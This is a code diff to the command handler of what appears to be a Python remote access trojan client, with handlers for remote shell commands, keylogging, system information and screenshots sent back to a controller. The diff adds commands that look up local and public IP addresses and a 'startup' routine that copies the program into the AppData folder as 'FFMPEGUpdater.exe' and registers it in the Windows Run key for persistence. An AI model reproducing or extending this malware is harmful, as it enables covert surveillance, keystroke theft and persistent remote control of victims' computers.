@@ -49,8 +49,6 @@ class CLIENT:
         data = command.decode('utf-8').split(":")
 
         if data[0] == "shell":
-
-            #print("Executing Shell: " + data[1])
             toexecute = data[1].rstrip(" ").lstrip(" ")
             toexecute = " ".join(toexecute.split())
             if toexecute.split(" ")[0] == "cd":
@@ -69,8 +67,6 @@ class CLIENT:
                     self.send_data("No Such File or Directory")
 
         elif data[0] == "keylogger":
-
-            #print("Executing Keylogger: " + data[1])
             if data[1] == "on":
                 self.turn_keylogger(True)
                 self.send_data("")
@@ -81,16 +77,47 @@ class CLIENT:
                 self.send_data(self.KEYLOGGER_STROKES)
 
         elif data[0] == "sysinfo":
-
-            #print("Executing Sysinfo: " + data[1])
             sysinfo = SYSINFO()
             self.send_data(sysinfo.get_data())
 
         elif data[0] == "screenshot":
-
-            #print("Executing Screenshot: " + data[1])
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
+
+        elif data[0] == "ipinfo":
+            try:
+                adapters = ifaddr.get_adapters()
+                msg = ""
+                for adapter in adapters:
+                    title = str("\nNetwork adapter name: '" +
+                                adapter.nice_name + "':\n")
+                    msg += title
+                    for ip in adapter.ips:
+                        desc = str("   IP: %s/%s" % (ip.ip, ip.network_prefix))
+                        msg += desc
+                msg += "\n"
+                ip = requests.get('https://api.ipify.org').text
+                msg += "\nPublic IP address: " + ip + "\n"
+                self.send_data(msg)
+            except:
+                msg = "- Could not get network adapters"
+                self.send_data(msg)
+
+        elif data[0] == "publicip":
+            try:
+                ip = requests.get('https://api.ipify.org').text
+                msg = f"+ PUBLIC IP: {ip}\n"
+                self.send_data(msg)
+            except:
+                msg = "- Could not get Public IP"
+                self.send_data(msg)
+
+        elif data[0] == "startup":
+            location = os.environ["appdata"] + "\\FFMPEGUpdater.exe"
+            if not os.path.exists(location):
+                shutil.copyfile(sys.executable, location)
+                subprocess.call(
+                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v FFMPEGUpdater /t REG_SZ /d "' + location + '"', shell=True)
 
     def acceptor(self):
         data = ""
